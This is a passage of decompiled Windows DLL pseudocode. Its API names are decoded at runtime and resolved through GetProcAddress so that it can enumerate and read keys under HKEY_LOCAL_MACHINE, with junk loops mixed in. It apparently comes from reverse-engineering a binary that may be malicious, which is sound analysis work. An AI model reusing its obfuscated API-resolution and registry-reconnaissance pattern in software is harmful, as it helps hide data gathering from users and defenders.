    "      if ( (unsigned int)v27 >= 0x1000 )",
    "      {",
    "        v26 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v27 = (const CHAR *)(2 * v192 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v26 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v27;",
    "      sub_100154EB(v26);",
    "    }",
    "    v191 = 0;",
    "    v192 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v210 > 0xF )",
    "    {",
    "      v28 = (CHAR *)lpLibFileName[0];",
    "      v29 = (const CHAR *)(v210 + 1);",
    "      if ( v210 + 1 >= 0x1000 )",
    "      {",
    "        v28 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v29 = (const CHAR *)(v210 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v28 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v29;",
    "      sub_100154EB(v28);",
    "    }",
    "    v209 = 0;",
    "    v210 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v201 > 0xF )",
    "    {",
    "      v30 = (CHAR *)lpProcName[0];",
    "      v31 = (const CHAR *)(v201 + 1);",
    "      if ( v201 + 1 >= 0x1000 )",
    "      {",
    "        v30 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v31 = (const CHAR *)(v201 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v30 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v31;",
    "      sub_100154EB(v30);",
    "    }",
    "    v200 = 0;",
    "    v201 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v207 > 7 )",
    "    {",
    "      v32 = (WCHAR *)lpModuleName[0];",
    "      v33 = (const CHAR *)(2 * v207 + 2);",
    "      if ( (unsigned int)v33 >= 0x1000 )",
    "      {",
    "        v32 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v33 = (const CHAR *)(2 * v207 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v32 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v33;",
    "      sub_100154EB(v32);",
    "    }",
    "    v206 = 0;",
    "    v207 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v195 > 0xF )",
    "    {",
    "      v34 = v193[0];",
    "      v35 = (const CHAR *)(v195 + 1);",
    "      if ( v195 + 1 >= 0x1000 )",
    "      {",
    "        v34 = (void *)*((_DWORD *)v193[0] - 1);",
    "        v35 = (const CHAR *)(v195 + 36);",
    "        if ( (unsigned int)((char *)v193[0] - (char *)v34 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v35;",
    "      sub_100154EB(v34);",
    "    }",
    "    v194 = 0;",
    "    v195 = 15;",
    "    LOBYTE(v193[0]) = 0;",
    "    if ( v204 > 7 )",
    "    {",
    "      v36 = v202[0];",
    "      v37 = (const CHAR *)(2 * v204 + 2);",
    "      if ( (unsigned int)v37 >= 0x1000 )",
    "      {",
    "        v36 = (void *)*((_DWORD *)v202[0] - 1);",
    "        v37 = (const CHAR *)(2 * v204 + 37);",
    "        if ( (unsigned int)((char *)v202[0] - (char *)v36 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v37;",
    "      sub_100154EB(v36);",
    "    }",
    "    v203 = 0;",
    "    v204 = 7;",
    "    LOWORD(v202[0]) = 0;",
    "    if ( v179 > 0xF )",
    "    {",
    "      v19 = v178[0];",
    "      v20 = (const CHAR *)(v179 + 1);",
    "      if ( v179 + 1 >= 0x1000 )",
    "      {",
    "        v19 = (void *)*((_DWORD *)v178[0] - 1);",
    "        v20 = (const CHAR *)(v179 + 36);",
    "        if ( (unsigned int)((char *)v178[0] - (char *)v19 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "LABEL_73:",
    "      v149 = v20;",
    "      sub_100154EB(v19);",
    "    }",
    "    return v1;",
    "  }",
    "  v213 = 0;",
    "  *(_OWORD *)v212 = 0;",
    "  sub_100018C0(v212, v148, (size_t)v149);",
    "  v39 = v164;",
    "  LOBYTE(v217) = 12;",
    "  for ( i = 0; ; ++i )",
    "  {",
    "    v158 = &v144;",
    "    sub_10009E70(v39 + 360);",
    "    sub_1000B000(&v144, v138, v139, v140, v141, v142, v143);",
    "    LOBYTE(v217) = 13;",
    "    sub_10009E70(v39 + 1152);",
    "    LOBYTE(v217) = 12;",
    "    sub_1000B970((int)v187, v138, v139, v140, v141, v142, v143, v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "    LOBYTE(v217) = 14;",
    "    v40 = v187;",
    "    v211 = 2048;",
    "    if ( v189 > 0xF )",
    "      v40 = (void **)v187[0];",
    "    v41 = (int (__stdcall *)(int, int, CHAR *, int *, _DWORD, _DWORD, _DWORD, _DWORD))((int (__stdcall *)(int, void **))ProcAddress)(",
    "                                                                                        cbMultiByte,",
    "                                                                                        v40);",
    "    if ( !v41 )",
    "      goto LABEL_137;",
    "    if ( v41(v166, i, MultiByteStr, &v211, 0, 0, 0, 0) )",
    "      break;",
    "    sub_10009E70(v39 + 1200);",
    "    sub_1000B000(&v144, v138, v139, v140, v141, v142, v143);",
    "    sub_1000AA30((int)v176, (LPCCH)v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "    LOBYTE(v217) = 15;",
    "    v42 = (const WCHAR *)v176;",
    "    v149 = MultiByteStr;",
    "    if ( v177 > 7 )",
    "      v42 = v176[0];",
    "    wsprintfW(v215, v42, v156, v149);",
    "    v43 = v196;",
    "    if ( v198 > 0xF )",
    "      v43 = (void **)v196[0];",
    "    if ( ((int (__stdcall *)(int, void **))ProcAddress)(cbMultiByte, v43) )",
    "    {",
    "      if ( v162(-2147483646, v215, 0, 131097, &lpWideCharStr) )",
    "      {",
    "        while ( 1 )",
    "          ;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v44 = 15;",
    "      do",
    "        ++v44;",
    "      while ( v44 != 20 && v44 );",
    "    }",
    "    v211 = 2048;",
    "    v161 = (int)&v138;",
    "    sub_10009E70(v164 + 408);",
    "    sub_1000B000(&v138, v126, v128, v130, v132, v134, v136);",
    "    LOBYTE(v217) = 16;",
    "    sub_10009E70(v164 + 1224);",
    "    LOBYTE(v217) = 15;",
    "    sub_1000B970((int)&v144, v127, v129, v131, v133, v135, v137, v138, v139, v140, v141, v142, v143);",
    "    sub_1000AA30((int)v181, (LPCCH)v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "    v39 = v164;",
    "    LOBYTE(v217) = 17;",
    "    v161 = (int)&v144;",
    "    sub_10009E70(v164 + 384);",
    "    sub_1000B000(&v144, v138, v139, v140, v141, v142, v143);",
    "    LOBYTE(v217) = 18;",
    "    sub_10009E70(v39 + 1176);",
    "    LOBYTE(v217) = 17;",
    "    sub_1000B970((int)v184, v138, v139, v140, v141, v142, v143, v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "    LOBYTE(v217) = 19;",
    "    v45 = v184;",
    "    if ( v186 > 0xF )",
    "      v45 = (void **)v184[0];",
    "    v46 = (int (__stdcall *)(LPCWCH, void **, _DWORD, int *, int *, LPCSTR))((int (__stdcall *)(int, void **))ProcAddress)(",
    "                                                                              cbMultiByte,",
    "                                                                              v45);",
    "    if ( !v46 )",
    "    {",
    "      v1 = v155;",
    "      v71 = v186;",
    "      *v155 = 0;",
    "      v1[4] = 0;",
    "      v1[5] = 0;",
    "      v72 = *(_OWORD *)v212;",
    "      LOBYTE(v212[0]) = 0;",
    "      *(_OWORD *)v1 = v72;",
    "      *((_QWORD *)v1 + 2) = v213;",
    "      v213 = 0xF00000000LL;",
    "      if ( v71 <= 0xF )",
    "        goto LABEL_146;",
    "      v73 = v184[0];",
    "      v74 = (const CHAR *)(v71 + 1);",
    "      if ( (unsigned int)v74 >= 0x1000 )",
    "      {",
    "        v73 = (void *)*((_DWORD *)v184[0] - 1);",
    "        v74 += 35;",
    "        if ( (unsigned int)((char *)v184[0] - (char *)v73 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v74;",
    "      sub_100154EB(v73);",
    "LABEL_146:",
    "      v185 = 0;",
    "      v186 = 15;",
    "      LOBYTE(v184[0]) = 0;",
    "      if ( v183 > 7 )",
    "      {",
    "        v75 = v181[0];",
    "        v76 = (const CHAR *)(2 * v183 + 2);",
    "        if ( (unsigned int)v76 < 0x1000",
    "          || (v75 = (void *)*((_DWORD *)v181[0] - 1),",
    "              v76 = (const CHAR *)(2 * v183 + 37),",
    "              (unsigned int)((char *)v181[0] - (char *)v75 - 4) <= 0x1F) )",
    "        {",
    "          v149 = v76;",
    "          sub_100154EB(v75);",
    "          goto LABEL_150;",
    "        }",
    "LABEL_253:",
    "        _invalid_parameter_noinfo_noreturn();",
    "      }",
    "LABEL_150:",
    "      v182 = 0;",
    "      v183 = 7;",
    "      LOWORD(v181[0]) = 0;",
    "      if ( v177 > 7 )",
    "      {",
    "        v77 = (WCHAR *)v176[0];",
    "        v78 = (const CHAR *)(2 * v177 + 2);",
    "        if ( (unsigned int)v78 >= 0x1000 )",
    "        {",
    "          v77 = (WCHAR *)*((_DWORD *)v176[0] - 1);",
    "          v78 = (const CHAR *)(2 * v177 + 37);",
    "          if ( (unsigned int)((char *)v176[0] - (char *)v77 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v78;",
    "        sub_100154EB(v77);",
    "      }",
    "      v176[4] = 0;",
    "      v177 = 7;",
    "      LOWORD(v176[0]) = 0;",
    "      if ( v189 > 0xF )",
    "      {",
    "        v79 = v187[0];",
    "        v80 = (const CHAR *)(v189 + 1);",
    "        if ( v189 + 1 >= 0x1000 )",
    "        {",
    "          v79 = (void *)*((_DWORD *)v187[0] - 1);",
    "          v80 = (const CHAR *)(v189 + 36);",
    "          if ( (unsigned int)((char *)v187[0] - (char *)v79 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v80;",
    "        sub_100154EB(v79);",
    "      }",
    "      v188 = 0;",
    "      v189 = 15;",
    "      LOBYTE(v187[0]) = 0;",
    "      if ( HIDWORD(v213) > 0xF )",
    "      {",
    "        v81 = v212[0];",
    "        v82 = (const CHAR *)(HIDWORD(v213) + 1);",
    "        if ( (unsigned int)(HIDWORD(v213) + 1) >= 0x1000 )",
    "        {",
    "          v81 = (void *)*((_DWORD *)v212[0] - 1);",
    "          v82 = (const CHAR *)(HIDWORD(v213) + 36);",
    "          if ( (unsigned int)((char *)v212[0] - (char *)v81 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v82;",
    "        sub_100154EB(v81);",
    "      }",
    "      v213 = 0xF00000000LL;",
    "      LOBYTE(v212[0]) = 0;",
    "      if ( v198 > 0xF )",
    "      {",
    "        v83 = v196[0];",
    "        v84 = (const CHAR *)(v198 + 1);",
    "        if ( v198 + 1 >= 0x1000 )",
    "        {",
    "          v83 = (void *)*((_DWORD *)v196[0] - 1);",
    "          v84 = (const CHAR *)(v198 + 36);",
    "          if ( (unsigned int)((char *)v196[0] - (char *)v83 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v84;",
    "        sub_100154EB(v83);",
    "      }",
    "      v197 = 0;",
    "      v198 = 15;",
    "      LOBYTE(v196[0]) = 0;",
    "      if ( v192 > 7 )",
    "      {",
    "        v85 = Block;",
    "        v86 = (const CHAR *)(2 * v192 + 2);",
    "        if ( (unsigned int)v86 >= 0x1000 )",
    "        {",
    "          v85 = (_BYTE *)*((_DWORD *)Block - 1);",
    "          v86 = (const CHAR *)(2 * v192 + 37);",
    "          if ( (unsigned int)((_BYTE *)Block - v85 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v86;",
    "        sub_100154EB(v85);",
    "      }",
    "      v191 = 0;",
    "      v192 = 7;",
    "      LOWORD(Block) = 0;",
    "      if ( v210 > 0xF )",
    "      {",
    "        v87 = (CHAR *)lpLibFileName[0];",
    "        v88 = (const CHAR *)(v210 + 1);",
    "        if ( v210 + 1 >= 0x1000 )",
    "        {",
    "          v87 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "          v88 = (const CHAR *)(v210 + 36);",
    "          if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v87 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v88;",
    "        sub_100154EB(v87);",
    "      }",
    "      v209 = 0;",
    "      v210 = 15;",
    "      LOBYTE(lpLibFileName[0]) = 0;",
    "      if ( v201 > 0xF )",
    "      {",
    "        v89 = (CHAR *)lpProcName[0];",
    "        v90 = (const CHAR *)(v201 + 1);",
    "        if ( v201 + 1 >= 0x1000 )",
    "        {",
    "          v89 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "          v90 = (const CHAR *)(v201 + 36);",
    "          if ( (unsigned int)(lpProcName[0] - (LPCSTR)v89 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v90;",
    "        sub_100154EB(v89);",
    "      }",
    "      v200 = 0;",
    "      v201 = 15;",
    "      LOBYTE(lpProcName[0]) = 0;",
    "      if ( v207 > 7 )",
    "      {",
    "        v91 = (WCHAR *)lpModuleName[0];",
    "        v92 = (const CHAR *)(2 * v207 + 2);",
    "        if ( (unsigned int)v92 >= 0x1000 )",
    "        {",
    "          v91 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "          v92 = (const CHAR *)(2 * v207 + 37);",
    "          if ( (unsigned int)((char *)lpModuleName[0] - (char *)v91 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v92;",
    "        sub_100154EB(v91);",
    "      }",
    "      v206 = 0;",
    "      v207 = 7;",
    "      LOWORD(lpModuleName[0]) = 0;",
    "      if ( v195 > 0xF )",
    "      {",
    "        v93 = v193[0];",
    "        v94 = (const CHAR *)(v195 + 1);",
    "        if ( v195 + 1 >= 0x1000 )",
    "        {",
    "          v93 = (void *)*((_DWORD *)v193[0] - 1);",
    "          v94 = (const CHAR *)(v195 + 36);",
    "          if ( (unsigned int)((char *)v193[0] - (char *)v93 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v94;",
    "        sub_100154EB(v93);",
    "      }",
    "      v194 = 0;",
    "      v195 = 15;",
    "      LOBYTE(v193[0]) = 0;",
    "      if ( v204 > 7 )",
    "      {",
    "        v17 = v202[0];",
    "        v18 = (const CHAR *)(2 * v204 + 2);",
    "        if ( (unsigned int)v18 >= 0x1000 )",
    "        {",
    "          v17 = (void *)*((_DWORD *)v202[0] - 1);",
    "          v18 = (const CHAR *)(2 * v204 + 37);",
    "          if ( (unsigned int)((char *)v202[0] - (char *)v17 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        goto LABEL_33;",
    "      }",
    "      goto LABEL_34;",
    "    }",
    "    v149 = (LPCSTR)&v211;",
    "    v148 = (int *)cchWideChar;",
    "    v147 = &v180;",
    "    v47 = v181;",
    "    if ( v183 > 7 )",
    "      v47 = (void **)v181[0];",
    "    if ( !v46(lpWideCharStr, v47, 0, v147, v148, v149) )",
    "    {",
    "      v168 = 0;",
    "      v169 = 0;",
    "      *(_OWORD *)v167 = 0;",
    "      sub_1000A170(v167, cchWideChar, wcslen(cchWideChar));",
    "      LOBYTE(v217) = 20;",
    "      sub_10009D70(v167);",
    "      sub_1000AD50((int)v170, (LPCWCH)v144, v145, v146, (int)v147, (int)v148, (int)v149);",
    "      LOBYTE(v217) = 21;",
    "      v174 = 0;",
    "      *(_OWORD *)v173 = 0;",
    "      v175 = 0;",
    "      sub_100018C0(v173, \"?\", 1u);",
    "      LOBYTE(v217) = 22;",
    "      if ( 0x7FFFFFFF - v171 < v174 )",
    "        sub_10001540();",
    "      v48 = v170;",
    "      v149 = (LPCSTR)v174;",
    "      if ( v172 > 0xF )",
    "        v48 = (void **)v170[0];",
    "      v49 = v173;",
    "      if ( v175 > 0xF )",
    "        v49 = (void **)v173[0];",
    "      sub_1000A6C0(Src, v161, (int)v48, (int)v48, v171, (int)v49, (size_t)v149);",
    "      LOBYTE(v217) = 23;",
    "      v50 = Src;",
    "      v51 = (char *)Src[0];",
    "      if ( v154 > 0xF )",
    "        v50 = (void **)Src[0];",
    "      v52 = v213;",
    "      v149 = (LPCSTR)Size;",
    "      v148 = (int *)v50;",
    "      if ( Size > HIDWORD(v213) - (int)v213 )",
    "      {",
    "        LOBYTE(v163) = 0;",
    "        sub_1000A260(v212, Size, v163, (int)v148, (size_t)v149);",
    "        v51 = (char *)Src[0];",
    "      }",
    "      else",
    "      {",
    "        LODWORD(v213) = Size + v213;",
    "        v53 = v212;",
    "        if ( HIDWORD(v213) > 0xF )",
    "          v53 = (void **)v212[0];",
    "        v54 = (char *)v53 + v52;",
    "        memmove(v54, v148, (size_t)v149);",
    "        v54[Size] = 0;",
    "      }",
    "      LOBYTE(v217) = 22;",
    "      if ( v154 > 0xF )",
    "      {",
    "        v55 = (const CHAR *)(v154 + 1);",
    "        v56 = v51;",
    "        if ( v154 + 1 >= 0x1000 )",
    "        {",
    "          v51 = (char *)*((_DWORD *)v51 - 1);",
    "          v55 = (const CHAR *)(v154 + 36);",
    "          if ( (unsigned int)(v56 - v51 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v55;",
    "        sub_100154EB(v51);",
    "      }",
    "      LOBYTE(v217) = 21;",
    "      if ( v175 > 0xF )",
    "      {",
    "        v57 = v173[0];",
    "        v58 = (const CHAR *)(v175 + 1);",
    "        if ( v175 + 1 >= 0x1000 )",
    "        {",
    "          v57 = (void *)*((_DWORD *)v173[0] - 1);",
    "          v58 = (const CHAR *)(v175 + 36);",
    "          if ( (unsigned int)((char *)v173[0] - (char *)v57 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v58;",
    "        sub_100154EB(v57);",
    "      }",
    "      LOBYTE(v217) = 20;",
    "      if ( v172 > 0xF )",
    "      {",
    "        v59 = v170[0];",
    "        v60 = (const CHAR *)(v172 + 1);",
    "        if ( v172 + 1 >= 0x1000 )",
    "        {",
    "          v59 = (void *)*((_DWORD *)v170[0] - 1);",
    "          v60 = (const CHAR *)(v172 + 36);",
    "          if ( (unsigned int)((char *)v170[0] - (char *)v59 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v60;",
    "        sub_100154EB(v59);",
    "      }",
    "      LOBYTE(v217) = 19;",
    "      v171 = 0;",
    "      v172 = 15;",
    "      LOBYTE(v170[0]) = 0;",
    "      if ( v169 > 7 )",
    "      {",
    "        v61 = v167[0];",
    "        v62 = (const CHAR *)(2 * v169 + 2);",
    "        if ( (unsigned int)v62 >= 0x1000 )",
    "        {",
    "          v61 = (void *)*((_DWORD *)v167[0] - 1);",
    "          v62 = (const CHAR *)(2 * v169 + 37);",
    "          if ( (unsigned int)((char *)v167[0] - (char *)v61 - 4) > 0x1F )",
    "            goto LABEL_253;",
    "        }",
    "        v149 = v62;",
    "        sub_100154EB(v61);",
    "      }",
    "      v39 = v164;",
    "    }",
    "    LOBYTE(v217) = 17;",
    "    if ( v186 > 0xF )",
    "    {",
    "      v63 = v184[0];",
    "      v64 = (const CHAR *)(v186 + 1);",
    "      if ( v186 + 1 >= 0x1000 )",
    "      {",
    "        v63 = (void *)*((_DWORD *)v184[0] - 1);",
    "        v64 = (const CHAR *)(v186 + 36);",
    "        if ( (unsigned int)((char *)v184[0] - (char *)v63 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v64;",
    "      sub_100154EB(v63);",
    "    }",
    "    LOBYTE(v217) = 15;",
    "    v185 = 0;",
    "    v186 = 15;",
    "    LOBYTE(v184[0]) = 0;",
    "    if ( v183 > 7 )",
    "    {",
    "      v65 = v181[0];",
    "      v66 = (const CHAR *)(2 * v183 + 2);",
    "      if ( (unsigned int)v66 >= 0x1000 )",
    "      {",
    "        v65 = (void *)*((_DWORD *)v181[0] - 1);",
    "        v66 = (const CHAR *)(2 * v183 + 37);",
    "        if ( (unsigned int)((char *)v181[0] - (char *)v65 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v66;",
    "      sub_100154EB(v65);",
    "    }",
    "    LOBYTE(v217) = 14;",
    "    v182 = 0;",
    "    v183 = 7;",
    "    LOWORD(v181[0]) = 0;",
    "    if ( v177 > 7 )",
    "    {",
    "      v67 = (WCHAR *)v176[0];",
    "      v68 = (const CHAR *)(2 * v177 + 2);",
    "      if ( (unsigned int)v68 >= 0x1000 )",
    "      {",
    "        v67 = (WCHAR *)*((_DWORD *)v176[0] - 1);",
    "        v68 = (const CHAR *)(2 * v177 + 37);",
    "        if ( (unsigned int)((char *)v176[0] - (char *)v67 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v68;",
    "      sub_100154EB(v67);",
    "    }",
    "LABEL_137:",
    "    LOBYTE(v217) = 12;",
    "    if ( v189 > 0xF )",
    "    {",
    "      v69 = v187[0];",
    "      v70 = (const CHAR *)(v189 + 1);",
    "      if ( v189 + 1 >= 0x1000 )",
    "      {",
    "        v69 = (void *)*((_DWORD *)v187[0] - 1);",
    "        v70 = (const CHAR *)(v189 + 36);",
    "        if ( (unsigned int)((char *)v187[0] - (char *)v69 - 4) > 0x1F )",
    "          goto LABEL_253;",
    "      }",
    "      v149 = v70;",
    "      sub_100154EB(v69);",
    "    }",
    "  }",
    "  v1 = v155;",
    "  v95 = v189;",
    "  v96 = 15;",
    "  *v155 = 0;",
    "  v1[4] = 0;",
    "  v1[5] = 0;",
    "  v97 = *(_OWORD *)v212;",
    "  LOBYTE(v212[0]) = 0;",
    "  *(_OWORD *)v1 = v97;",
    "  *((_QWORD *)v1 + 2) = v213;",
    "  v213 = 0xF00000000LL;",
    "  if ( v95 > 0xF )",
    "  {",
    "    v98 = v187[0];",
    "    v99 = (const CHAR *)(v95 + 1);",
    "    if ( (unsigned int)v99 >= 0x1000 )",
    "    {",
    "      v98 = (void *)*((_DWORD *)v187[0] - 1);",
    "      v99 += 35;",
    "      if ( (unsigned int)((char *)v187[0] - (char *)v98 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v99;",
    "    sub_100154EB(v98);",
    "    v96 = HIDWORD(v213);",
    "  }",
    "  v188 = 0;",
    "  v189 = 15;",
    "  LOBYTE(v187[0]) = 0;",
    "  if ( v96 > 0xF )",
    "  {",
    "    v100 = v212[0];",
    "    v101 = (const CHAR *)(v96 + 1);",
    "    if ( v96 + 1 >= 0x1000 )",
    "    {",
    "      v100 = (void *)*((_DWORD *)v212[0] - 1);",
    "      v101 = (const CHAR *)(v96 + 36);",
    "      if ( (unsigned int)((char *)v212[0] - (char *)v100 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v101;",
    "    sub_100154EB(v100);",
    "  }",
    "  v213 = 0xF00000000LL;",
    "  LOBYTE(v212[0]) = 0;",
    "  if ( v198 > 0xF )",
    "  {",
    "    v102 = v196[0];",
    "    v103 = (const CHAR *)(v198 + 1);",
    "    if ( v198 + 1 >= 0x1000 )",
    "    {",
    "      v102 = (void *)*((_DWORD *)v196[0] - 1);",
    "      v103 = (const CHAR *)(v198 + 36);",
    "      if ( (unsigned int)((char *)v196[0] - (char *)v102 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v103;",
    "    sub_100154EB(v102);",
    "  }",
    "  v197 = 0;",
    "  v198 = 15;",
    "  LOBYTE(v196[0]) = 0;",
    "  if ( v192 > 7 )",
    "  {",
    "    v104 = Block;",
    "    v105 = (const CHAR *)(2 * v192 + 2);",
    "    if ( (unsigned int)v105 >= 0x1000 )",
    "    {",
    "      v104 = (_BYTE *)*((_DWORD *)Block - 1);",
    "      v105 = (const CHAR *)(2 * v192 + 37);",
    "      if ( (unsigned int)((_BYTE *)Block - v104 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v105;",
    "    sub_100154EB(v104);",
    "  }",
    "  v191 = 0;",
    "  v192 = 7;",
    "  LOWORD(Block) = 0;",
    "  if ( v210 > 0xF )",
    "  {",
    "    v106 = (CHAR *)lpLibFileName[0];",
    "    v107 = (const CHAR *)(v210 + 1);",
    "    if ( v210 + 1 >= 0x1000 )",
    "    {",
    "      v106 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "      v107 = (const CHAR *)(v210 + 36);",
    "      if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v106 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v107;",
    "    sub_100154EB(v106);",
    "  }",
    "  v209 = 0;",
    "  v210 = 15;",
    "  LOBYTE(lpLibFileName[0]) = 0;",
    "  if ( v201 > 0xF )",
    "  {",
    "    v108 = (CHAR *)lpProcName[0];",
    "    v109 = (const CHAR *)(v201 + 1);",
    "    if ( v201 + 1 >= 0x1000 )",
    "    {",
    "      v108 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v109 = (const CHAR *)(v201 + 36);",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v108 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v109;",
    "    sub_100154EB(v108);",
    "  }",
    "  v200 = 0;",
    "  v201 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v207 > 7 )",
    "  {",
    "    v110 = (WCHAR *)lpModuleName[0];",
    "    v111 = (const CHAR *)(2 * v207 + 2);",
    "    if ( (unsigned int)v111 >= 0x1000 )",
    "    {",
    "      v110 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v111 = (const CHAR *)(2 * v207 + 37);",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v110 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v111;",
    "    sub_100154EB(v110);",
    "  }",
    "  v206 = 0;",
    "  v207 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v195 > 0xF )",
    "  {",
    "    v112 = v193[0];",
    "    v113 = (const CHAR *)(v195 + 1);",
    "    if ( v195 + 1 >= 0x1000 )",
    "    {",
    "      v112 = (void *)*((_DWORD *)v193[0] - 1);",
    "      v113 = (const CHAR *)(v195 + 36);",
    "      if ( (unsigned int)((char *)v193[0] - (char *)v112 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    v149 = v113;",
    "    sub_100154EB(v112);",
    "  }",
    "  v194 = 0;",
    "  v195 = 15;",
    "  LOBYTE(v193[0]) = 0;",
    "  if ( v204 > 7 )",
    "  {",
    "    v17 = v202[0];",
    "    v18 = (const CHAR *)(2 * v204 + 2);",
    "    if ( (unsigned int)v18 >= 0x1000 )",
    "    {",
    "      v17 = (void *)*((_DWORD *)v202[0] - 1);",
    "      v18 = (const CHAR *)(2 * v204 + 37);",
    "      if ( (unsigned int)((char *)v202[0] - (char *)v17 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    goto LABEL_33;",
    "  }",
    "LABEL_34:",
    "  v203 = 0;",
    "  v204 = 7;",
    "  LOWORD(v202[0]) = 0;",
    "  if ( v179 > 0xF )",
    "  {",
    "    v19 = v178[0];",
    "    v20 = (const CHAR *)(v179 + 1);",
    "    if ( v179 + 1 >= 0x1000 )",
    "    {",
    "      v19 = (void *)*((_DWORD *)v178[0] - 1);",
    "      v20 = (const CHAR *)(v179 + 36);",
    "      if ( (unsigned int)((char *)v178[0] - (char *)v19 - 4) > 0x1F )",
    "        goto LABEL_253;",
    "    }",
    "    goto LABEL_73;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "int __stdcall sub_10008110(int a1)",
    "{",
    "  int v6; // edi",
    "  unsigned int v7; // kr00_4",
    "  int v8; // ecx",
    "  void **v9; // edi",
    "  char *v10; // edi",
    "  _DWORD *v11; // edi",
    "  _DWORD *v12; // ecx",
    "  unsigned int v13; // esi",
    "  int v14; // edx",
    "  _DWORD *v15; // eax",
    "  __int128 v16; // xmm0",
    "  int v17; // ecx",
    "  void **v18; // eax",
    "  void **v19; // eax",
    "  __int128 v20; // xmm0",
    "  int v21; // esi",
    "  void *v22; // edx",
    "  void *v23; // edx",
    "  void *v24; // edx",
    "  void *v25; // edx",
    "  void *v26; // edx",
    "  void *v27; // edx",
    "  void *v29[4]; // [esp+10h] [ebp-BCh] BYREF",
    "  __int64 v30; // [esp+20h] [ebp-ACh]",
    "  void *v31[5]; // [esp+28h] [ebp-A4h] BYREF",
    "  unsigned int v32; // [esp+3Ch] [ebp-90h]",
    "  void *v33[5]; // [esp+40h] [ebp-8Ch] BYREF",
    "  unsigned int v34; // [esp+54h] [ebp-78h]",
    "  void *v35[4]; // [esp+58h] [ebp-74h] BYREF",
    "  int v36; // [esp+68h] [ebp-64h]",
    "  unsigned int v37; // [esp+6Ch] [ebp-60h]",
    "  void *Block[4]; // [esp+70h] [ebp-5Ch] BYREF",
    "  int v39; // [esp+80h] [ebp-4Ch]",
    "  unsigned int v40; // [esp+84h] [ebp-48h]",
    "  int v41; // [esp+88h] [ebp-44h]",
    "  int v42; // [esp+8Ch] [ebp-40h]",
    "  int v43; // [esp+90h] [ebp-3Ch]",
    "  int v44; // [esp+94h] [ebp-38h]",
    "  char ArgList[16]; // [esp+98h] [ebp-34h] BYREF",
    "  unsigned __int64 v46; // [esp+A8h] [ebp-24h]",
    "  char Src[12]; // [esp+B0h] [ebp-1Ch] BYREF",
    "  int v48; // [esp+C8h] [ebp-4h]",
